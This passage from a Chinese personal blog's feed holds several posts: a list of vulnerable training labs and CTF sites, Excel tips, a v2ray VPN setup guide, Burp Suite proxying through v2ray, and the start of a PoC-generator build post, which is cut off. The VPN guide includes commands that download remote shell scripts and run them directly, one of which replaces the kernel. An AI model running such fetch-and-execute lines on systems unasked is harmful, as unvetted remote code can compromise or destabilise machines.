href="https://pod.cybersecuritychallenge.org.uk/" target="_blank" rel="noopener">https://pod.cybersecuritychallenge.org.uk/</a></td></tr><tr><td>pwn0</td><td><a href="https://pwn0.com/home.php" target="_blank" rel="noopener">https://pwn0.com/home.php</a></td></tr><tr><td>RootContest</td><td><a href="http://rootcontest.com/" target="_blank" rel="noopener">http://rootcontest.com/</a></td></tr><tr><td>Root Me</td><td><a href="http://www.root-me.org/?lang=en" target="_blank" rel="noopener">http://www.root-me.org/?lang=en</a></td></tr><tr><td>Security Treasure Hunt</td><td><a href="http://www.securitytreasurehunt.com/" target="_blank" rel="noopener">http://www.securitytreasurehunt.com/</a></td></tr><tr><td>Smash The Stack</td><td><a href="http://www.smashthestack.org/" target="_blank" rel="noopener">http://www.smashthestack.org/</a></td></tr><tr><td>SQLZoo</td><td><a href="http://sqlzoo.net/hack/" target="_blank" rel="noopener">http://sqlzoo.net/hack/</a></td></tr><tr><td>TheBlackSheep and Erik</td><td><a href="http://www.bright-shadows.net/" target="_blank" rel="noopener">http://www.bright-shadows.net/</a></td></tr><tr><td>ThisIsLegal</td><td><a href="http://thisislegal.com/" target="_blank" rel="noopener">http://thisislegal.com/</a></td></tr><tr><td>Try2Hack</td><td><a href="http://www.try2hack.nl/" target="_blank" rel="noopener">http://www.try2hack.nl/</a></td></tr><tr><td>WabLab</td><td><a href="http://www.wablab.com/hackme" target="_blank" rel="noopener">http://www.wablab.com/hackme</a></td></tr><tr><td>XSS: Can You XSS This?</td><td><a href="http://canyouxssthis.com/HTMLSanitizer/" target="_blank" rel="noopener">http://canyouxssthis.com/HTMLSanitizer/</a></td></tr><tr><td>XSS Game</td><td><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">https://xss-game.appspot.com/</a></td></tr><tr><td>XSS: ProgPHP</td><td><a href="http://xss.progphp.com/" target="_blank" rel="noopener">http://xss.progphp.com/</a></td></tr></tbody></table><h1 id="0x06-CTF-Sites-Archives"><a href="#0x06-CTF-Sites-Archives" class="headerlink" title="0x06 CTF Sites / Archives"></a>0x06 <strong>CTF Sites / Archives</strong></h1><table><thead><tr><th>CAPTF Repo</th><th><a href="http://captf.com/" target="_blank" rel="noopener">http://captf.com/</a></th></tr></thead><tbody><tr><td>CTFtime (Details of CTF Challenges)</td><td><a href="http://ctftime.org/ctfs/" target="_blank" rel="noopener">http://ctftime.org/ctfs/</a></td></tr><tr><td>CTF write-ups repository</td><td><a href="https://github.com/ctfs" target="_blank" rel="noopener">https://github.com/ctfs</a></td></tr><tr><td>Reddit CTF Announcements</td><td><a href="http://www.reddit.com/r/securityctf" target="_blank" rel="noopener">http://www.reddit.com/r/securityctf</a></td></tr><tr><td>shell-storm Repo</td><td><a href="http://shell-storm.org/repo/CTF/" target="_blank" rel="noopener">http://shell-storm.org/repo/CTF/</a></td></tr><tr><td>VulnHub</td><td><a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com</a></td></tr></tbody></table><h1 id="0x07-Mobile-Apps"><a href="#0x07-Mobile-Apps" class="headerlink" title="0x07 Mobile Apps"></a>0x07 <strong>Mobile Apps</strong></h1><table><thead><tr><th>Damn Vulnerable Android App (DVAA)</th><th><a href="https://code.google.com/p/dvaa/" target="_blank" rel="noopener">https://code.google.com/p/dvaa/</a></th></tr></thead><tbody><tr><td>Damn Vulnerable FirefoxOS Application (DVFA)</td><td><a href="https://github.com/pwnetrationguru/dvfa/" target="_blank" rel="noopener">https://github.com/pwnetrationguru/dvfa/</a></td></tr><tr><td>Damn Vulnerable iOS App (DVIA)</td><td><a href="http://damnvulnerableiosapp.com/" target="_blank" rel="noopener">http://damnvulnerableiosapp.com/</a></td></tr><tr><td>ExploitMe Mobile Android Labs</td><td><a href="http://securitycompass.github.io/AndroidLabs/" target="_blank" rel="noopener">http://securitycompass.github.io/AndroidLabs/</a></td></tr><tr><td>ExploitMe Mobile iPhone Labs</td><td><a href="http://securitycompass.github.io/iPhoneLabs/" target="_blank" rel="noopener">http://securitycompass.github.io/iPhoneLabs/</a></td></tr><tr><td>Hacme Bank Android</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx</a></td></tr><tr><td>InsecureBank</td><td><a href="http://www.paladion.net/downloadapp.html" target="_blank" rel="noopener">http://www.paladion.net/downloadapp.html</a></td></tr><tr><td>NcN Wargame</td><td><a href="http://noconname.org/evento/wargame/" target="_blank" rel="noopener">http://noconname.org/evento/wargame/</a></td></tr><tr><td>OWASP iGoat</td><td><a href="http://code.google.com/p/owasp-igoat/" target="_blank" rel="noopener">http://code.google.com/p/owasp-igoat/</a></td></tr><tr><td>OWASP Goatdroid</td><td><a href="https://github.com/jackMannino/OWASP-GoatDroid-Project" target="_blank" rel="noopener">https://github.com/jackMannino/OWASP-GoatDroid-Project</a></td></tr></tbody></table><h1 id="0x08-Lab"><a href="#0x08-Lab" class="headerlink" title="0x08 Lab"></a>0x08 <strong>Lab</strong></h1><table><thead><tr><th>binjitsu</th><th><a href="https://github.com/binjitsu/binjitsu" target="_blank" rel="noopener">https://github.com/binjitsu/binjitsu</a></th></tr></thead><tbody><tr><td>CTFd</td><td><a href="https://github.com/isislab/CTFd" target="_blank" rel="noopener">https://github.com/isislab/CTFd</a></td></tr><tr><td>Mellivora</td><td><a href="https://github.com/Nakiami/mellivora" target="_blank" rel="noopener">https://github.com/Nakiami/mellivora</a></td></tr><tr><td>NightShade</td><td><a href="https://github.com/UnrealAkama/NightShade" target="_blank" rel="noopener">https://github.com/UnrealAkama/NightShade</a></td></tr><tr><td>MCIR</td><td><a href="https://github.com/SpiderLabs/MCIR" target="_blank" rel="noopener">https://github.com/SpiderLabs/MCIR</a></td></tr><tr><td>Docker</td><td><a href="https://www.docker.com/" target="_blank" rel="noopener">https://www.docker.com/</a></td></tr><tr><td>Vagrant</td><td><a href="https://www.vagrantup.com/" target="_blank" rel="noopener">https://www.vagrantup.com/</a></td></tr><tr><td>NETinVM</td><td><a href="http://informatica.uv.es/~carlos/docencia/netinvm/" target="_blank" rel="noopener">http://informatica.uv.es/~carlos/docencia/netinvm/</a></td></tr><tr><td>SmartOS</td><td><a href="https://smartos.org/" target="_blank" rel="noopener">https://smartos.org/</a></td></tr><tr><td>SmartDataCenter</td><td><a href="https://github.com/joyent/sdc" target="_blank" rel="noopener">https://github.com/joyent/sdc</a></td></tr><tr><td>vSphere Hypervisor</td><td><a href="https://www.vmware.com/products/vsphere-hypervisor/" target="_blank" rel="noopener">https://www.vmware.com/products/vsphere-hypervisor/</a></td></tr><tr><td>GNS3</td><td><a href="http://sourceforge.net/projects/gns-3/" target="_blank" rel="noopener">http://sourceforge.net/projects/gns-3/</a></td></tr><tr><td>OCCP</td><td><a href="https://opencyberchallenge.net/" target="_blank" rel="noopener">https://opencyberchallenge.net/</a></td></tr><tr><td>XAMPP</td><td><a href="https://www.apachefriends.org/index.html" target="_blank" rel="noopener">https://www.apachefriends.org/index.html</a></td></tr></tbody></table><h1 id="0x09-Miscellaneous"><a href="#0x09-Miscellaneous" class="headerlink" title="0x09 Miscellaneous"></a>0x09 <strong>Miscellaneous</strong></h1><table><thead><tr><th>VulnVPN</th><th><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></th></tr></thead><tbody><tr><td>VulnVoIP</td><td><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></td></tr><tr><td>Vulnserver</td><td><a href="http://www.thegreycorner.com/2010/12/introducing-vulnserver.html" target="_blank" rel="noopener">http://www.thegreycorner.com/2010/12/introducing-vulnserver.html</a></td></tr><tr><td>NETinVM</td><td><a href="http://informatica.uv.es/~carlos/docencia/netinvm/" target="_blank" rel="noopener">http://informatica.uv.es/~carlos/docencia/netinvm/</a></td></tr><tr><td>DVRF</td><td><a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="noopener">https://github.com/praetorian-inc/DVRF</a></td></tr><tr><td>HackSys Extreme Vulnerable Driver</td><td><a href="http://www.payatu.com/hacksys-extreme-vulnerable-driver/" target="_blank" rel="noopener">http://www.payatu.com/hacksys-extreme-vulnerable-driver/</a></td></tr><tr><td>VirtuaPlant</td><td><a href="https://github.com/jseidl/virtuaplant" target="_blank" rel="noopener">https://github.com/jseidl/virtuaplant</a></td></tr><tr><td>Fosscomm</td><td><a href="https://github.com/nikosdano/fosscomm" target="_blank" rel="noopener">https://github.com/nikosdano/fosscomm</a></td></tr><tr><td>Morning Catch</td><td><a href="http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/" target="_blank" rel="noopener">http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/</a></td></tr><tr><td>AWBO</td><td><a href="https://labs.snort.org/awbo/awbo.html" target="_blank" rel="noopener">https://labs.snort.org/awbo/awbo.html</a></td></tr></tbody></table><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在学习渗透测试的过程中，光学理论知识是不够的，还需要结合实战来进行学习。但是国家法律是不允许我们对互联网上的web站在未授权的情况下进行渗透测试的，所以我们只能通过自己搭建环境来进行学习。下面给大家分享一些靶场，免得大家再去寻找。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶场" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA/"/>
    
    
      <category term="靶场" scheme="https://www.mad-coding.cn/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MS2016-Excel使用的一些技巧</title>
    <link href="https://www.mad-coding.cn/2019/09/25/MS2016-Excel%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
    <id>https://www.mad-coding.cn/2019/09/25/MS2016-Excel使用的一些技巧/</id>
    <published>2019-09-25T09:01:33.000Z</published>
    <updated>2019-09-25T09:20:39.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在这个信息大爆炸的时代，不会电脑的电脑白将难以生存，不会office办公软件的电脑白将难以升职加薪。这里主要记录一下自己在工作中碰到的一些excel问题，方便他人，利于自己。皮卡皮卡~</p><a id="more"></a><h1 id="0x01-解决问题"><a href="#0x01-解决问题" class="headerlink" title="0x01 解决问题"></a>0x01 解决问题</h1><h2 id="1-1-设置行高"><a href="#1-1-设置行高" class="headerlink" title="1.1 设置行高"></a>1.1 设置行高</h2><p>右击需要设置的行和列，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170616.png" class="lozad"></p><h2 id="1-2-合并多个文件"><a href="#1-2-合并多个文件" class="headerlink" title="1.2 合并多个文件"></a>1.2 合并多个文件</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170637.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170645.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170653.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170702.png" class="lozad"></p><p>然后等待数据被加载出来</p><h2 id="1-3-冻结指定的行和列"><a href="#1-3-冻结指定的行和列" class="headerlink" title="1.3 冻结指定的行和列"></a>1.3 冻结指定的行和列</h2><h3 id="1-3-1-案例1"><a href="#1-3-1-案例1" class="headerlink" title="1.3.1 案例1"></a>1.3.1 案例1</h3><blockquote><p>冻结首行首列只需要点击A2,B2单元格</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170758.png" class="lozad"></p><p>然后到视图-&gt;冻结窗口-&gt;冻结窗口</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170809.png" class="lozad"></p><p>结果展示</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170824.gif" class="lozad"></p><h3 id="1-3-2-案例2"><a href="#1-3-2-案例2" class="headerlink" title="1.3.2 案例2"></a>1.3.2 案例2</h3><blockquote><p>冻结指定行列</p></blockquote><p>为了给大家更形象的理解，我画了一个丑图，希望大家可以看懂^v^</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171343.png" class="lozad"></p><p>想冻结前两行，前两列</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171624.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171726.png" class="lozad"></p><p>结果展示：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171838.gif" class="lozad"></p><h1 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在这个信息大爆炸的时代，不会电脑的电脑白将难以生存，不会office办公软件的电脑白将难以升职加薪。这里主要记录一下自己在工作中碰到的一些excel问题，方便他人，利于自己。皮卡皮卡~&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://www.mad-coding.cn/categories/Windows/"/>
    
    
      <category term="解决问题" scheme="https://www.mad-coding.cn/tags/%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>9元钱搭建一个自己的VPN</title>
    <link href="https://www.mad-coding.cn/2019/09/20/9%E5%85%83%E9%92%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84VPN/"/>
    <id>https://www.mad-coding.cn/2019/09/20/9元钱搭建一个自己的VPN/</id>
    <published>2019-09-20T08:42:59.000Z</published>
    <updated>2019-09-20T09:09:42.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>科学上网。。。。此处省略一万字</p><a id="more"></a><h1 id="0x01-需求分析"><a href="#0x01-需求分析" class="headerlink" title="0x01 需求分析"></a>0x01 需求分析</h1><blockquote><p>1.一个Linux系统的vps</p><p>2.v2ray脚本</p><p>3.v2ray客户端</p></blockquote><h1 id="0x02-购买VPS"><a href="#0x02-购买VPS" class="headerlink" title="0x02 购买VPS"></a>0x02 购买VPS</h1><p>购买地址：<a href="https://virmach.com/" target="_blank" rel="noopener">传送门</a>,选择第四项，经济实惠的<code>Linux</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165438.png" class="lozad"></p><p>然后拉到最底下，选择<code>KVM VPS</code>，注意，这里不要选<code>open VZ</code>的<code>VPS</code>，因为这个虚拟主机不能进行<code>bbr plus</code>加速，笔者在这里踩了一个大坑，找了好久资料，没有解决，最后在团队群里的一个小伙伴告诉我了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165452.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165505.png" class="lozad"></p><p>选择vps的配置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165517.png" class="lozad"></p><p>位置就选默认的，速度杠杠的，然后添加到购物车</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165529.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165536.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165542.png" class="lozad"></p><p>完成订单后会跳到支付宝付款的界面，扫码付钱就行了。</p><p>之所以选择Ubuntu16位的系统是因为笔者试过了debian，centos的系统，发现都不行，真是所有坑都被我踩了。</p><h1 id="0x03-安装-V2Ray"><a href="#0x03-安装-V2Ray" class="headerlink" title="0x03 安装 V2Ray"></a>0x03 安装 V2Ray</h1><p>输入下面命令回车，你可以复制过去，然后在 Xshell 界面按 Shift + Insert 即可粘贴，不能按 Ctrl + V 的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br></pre></td></tr></table></figure><p>如果提示 curl: command not found ，那是因为你的 VPS 没装 Curl</p><p>ubuntu/debian 系统安装 Curl 方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get install curl -y</span><br></pre></td></tr></table></figure><p>centos 系统安装 Curl 方法: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y &amp;&amp; yum install curl -y</span><br></pre></td></tr></table></figure><p>安装好 curl 之后就能安装脚本了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165722.png" class="lozad"></p><p>输入1，回车，开始安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165730.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165738.png" class="lozad"></p><p>选择协议，默认TCP，回车即可</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165815.png" class="lozad"></p><p>选择端口，回车</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165828.png" class="lozad"></p><p>广告拦截，回车自动选择N</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165843.png" class="lozad"></p><p>配置Shadowsocks，有需要的可以配置，也可以先不配置，等配置好v2ray以后在配置也可以</p><p>最后按enter键，等待一会，会有v2ray的配置信息出现，说明配置好了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165900.png" class="lozad"></p><p>下载v2ray的客户端，然后导入刚刚复制的复制的配置信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165911.png" class="lozad"></p><p>选择从剪切板导入，导入成功后会出现下图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165920.png" class="lozad"></p><p>有点右下角的v2ray客户端小图标，点击启用http代理</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165935.png" class="lozad"></p><p>模式选择，有<strong>全局模式</strong>和PAC模式，</p><p><strong>全局模式</strong>状态下，你访问的所有流量都会先经过vps服务器，相当于vps是一个中间者，</p><p><strong>PAC模式</strong>状态下，你访问的流量会自动分流，国内的网站不会经过vps，只有国外的网站才会经过vps</p><p>OK,现在就可以访问Google试试了，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170005.png" class="lozad"></p><p>访问YouTube</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170028.png" class="lozad"></p><p>到这里，FQ已经是成功了，但是，有个问题就是访问的网速却很慢，so，需要进行加速操作。</p><h1 id="0x04-BBR-plus内核加速"><a href="#0x04-BBR-plus内核加速" class="headerlink" title="0x04 BBR plus内核加速"></a>0x04 BBR plus内核加速</h1><h2 id="4-1-安装证书"><a href="#4-1-安装证书" class="headerlink" title="4.1 安装证书"></a>4.1 安装证书</h2><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install ca-certificates</span><br><span class="line">或</span><br><span class="line">yum -y install ca-certificates</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170235.png" class="lozad"></p><h2 id="4-2-安装加速脚本"><a href="#4-2-安装加速脚本" class="headerlink" title="4.2 安装加速脚本"></a>4.2 安装加速脚本</h2><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;https://github.com/chiakge/Linux-NetSpeed/raw/master/tcp.sh&quot; &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure><p>先在[1– 3]切换内核（第一次显示为bbr内核也要切换一遍），重启</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170336.png" class="lozad"></p><p>安装完成，重启vps</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170350.png" class="lozad"></p><h2 id="4-2-运行"><a href="#4-2-运行" class="headerlink" title="4.2 运行"></a>4.2 运行</h2><p>重启后不用再下载脚本，直接<code>./tcp.sh</code> ，在[4 – 8]中选你要开的加速</p><blockquote><p>“1. 安装 BBR/BBR魔改版内核” 对应4,5,6（原版，魔改，暴力魔改）</p><p>“2. 安装 BBRplus版内核 ” 对应7（plus）</p><p>“3. 安装 Lotserver(锐速)内核” 对应8（锐速）</p></blockquote><p>开启后再 ./tcp.sh ， 显示开启成功则启动成功，你也可以自己手动确认</p><p>现在你可以自由的切换你想要的加速，直到你不想折腾为止~</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170540.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170600.png" class="lozad"></p><p>然后在访问YouTube，测试速度，发现速度飕飕的。1080p点到哪里看哪里。</p><h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><ol><li><a href="https://github.com/233boy/v2ray/wiki/V2Ray搭建详细图文教程" target="_blank" rel="noopener">https://github.com/233boy/v2ray/wiki/V2Ray%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B</a></li><li><a href="https://zhujiwiki.com/8563/" target="_blank" rel="noopener">https://zhujiwiki.com/8563/</a></li></ol><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;科学上网。。。。此处省略一万字&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用burpsuite抓取Google的数据包</title>
    <link href="https://www.mad-coding.cn/2019/09/20/%E4%BD%BF%E7%94%A8burpsuite%E6%8A%93%E5%8F%96Google%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
    <id>https://www.mad-coding.cn/2019/09/20/使用burpsuite抓取Google的数据包/</id>
    <published>2019-09-20T08:36:18.000Z</published>
    <updated>2019-09-20T08:41:35.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们在测试的过程中，可能会碰到必须需要挂VPN代理才能访问的网站，但是挂了VPN以后，就不能继续设置代理抓包了，最近有一个朋友帮助我解决了这一问题。下面来给大家讲讲其中的原理和操作方法。</p><h1 id="0x01-需要的环境"><a href="#0x01-需要的环境" class="headerlink" title="0x01 需要的环境"></a>0x01 需要的环境</h1><blockquote><p>本机：Windows10 X64</p><p>需要的软件：V2ray客户端</p><p>​    burpsuite</p><p>VPS:安装了v2ray</p></blockquote><h1 id="0x02-原理解析"><a href="#0x02-原理解析" class="headerlink" title="0x02 原理解析"></a>0x02 原理解析</h1><p>原理及时本地浏览器开启本地的8080端口的代理，然后在burp中设置一个1080的本地端口代理。然后通过V2ray客户端将本地的1080端口和vps的43085端口映射上。这样就大ton过本地浏览器-&gt;burpsuite-&gt;vps-&gt;目标网站的通路，当然抓包也就不成问题了，下图是我按照自己的理解画的一个数据流向图，帮助大家理解一下其中的原理，如果理解错误的地方，欢迎大家指出。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163850.png" class="lozad"></p><h1 id="0x03-操作流程"><a href="#0x03-操作流程" class="headerlink" title="0x03 操作流程"></a>0x03 操作流程</h1><p>1.浏览器开启代理</p><p>这里我使用了代理工具了，也可以直接在设置里面去设置。这个不会的请出门右转百度。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163916.png" class="lozad"></p><p>2.burp中的设置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163926.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163940.png" class="lozad"></p><p>3.v2ray客户端的配置</p><p>需要开启全局代理模式。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164003.png" class="lozad"></p><p>4.访问测试</p><p>burp下不拦截数据包，随便访问一个网站，看看能否正常访问，可以正常访问说明数据是通的，配置没有问题。</p><p>可以正常访问hao123.</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164022.png" class="lozad"></p><p>访问谷歌也是正常</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164038.png" class="lozad"></p><p>看看<code>burpsuite</code>的历史记录中，已经有了谷歌和<code>hao123</code>的数据包记录。 数据的流向正的没有问题。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164049.png" class="lozad"></p><p>抓一个youtube的包试试，成功抓到了YouTube的请求包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164106.png" class="lozad"></p><p>YouTube的返回包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164119.png" class="lozad"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>前人栽树后人乘凉，本着分享的精神和大家分享一下，大家共同进步，觉得文章不错的点个赞就好，觉得很烂的，留下你的足迹就好。</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;我们在测试的过程中，可能会碰到必须需要挂VPN代理才能访问的网站，但是挂了VPN以后，就不能继续设置
      
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="burpsuite" scheme="https://www.mad-coding.cn/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>本地搭建一个poc生成器</title>
    <link href="https://www.mad-coding.cn/2019/09/17/%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AApoc%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <id>https://www.mad-coding.cn/2019/09/17/本地搭建一个poc生成器/</id>
    <published>2019-09-17T09:59:08.000Z</published>
    <updated>2019-09-25T09:28:00.944Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天在网上意外看到一个在线的<code>poc</code>生成工具，<a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">传送门</a>,界面如下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180032.png" class="lozad"></p><p>看到网址应该使用<code>GitHub page</code>来生成的，于是条件反射的觉得这个工具应该是开源的，so，复制<a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">xray-poc-generation</a>到<code>GitHub</code>上搜一下看看，果然，和我猜测的一样，这个工具是开源的。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180131.png" class="lozad"></p><p><code>GitHub</code>截图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180144.png" class="lozad"></p><h1 id="0x01-编译项目"><a href="#0x01-编译项目" class="headerlink" title="0x01 编译项目"></a>0x01 编译项目</h1><blockquote><p>环境需求：</p><p>Git  <a href="https://www.git-scm.com/download/" target="_blank" rel="noopener">传送门</a></p><p>Node.js <a href="http://nodejs.cn/download/" target="_blank" rel="noopener">传送门</a></p><p>Yarn</p></blockquote><p>安装好<code>Git</code>后，使用<code>git</code>将项目克隆到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/phith0n/xray-poc-generation</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180528.png" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 